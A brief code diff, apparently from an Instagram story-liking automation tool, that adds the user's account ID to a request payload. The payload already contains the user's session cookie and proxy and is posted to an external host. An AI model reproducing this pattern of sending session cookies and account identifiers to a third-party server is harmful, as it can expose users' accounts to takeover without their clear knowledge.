@@ -653,6 +653,7 @@ def send_story_like(user, media_ids):
             "cookie": user.cookie,
             "data":media_ids,
             "proxy":user.proxy,
+            "ig_id":user.id
         }
     try:    
         x = requests.post("https://api.denotech.in/demo",json=data)
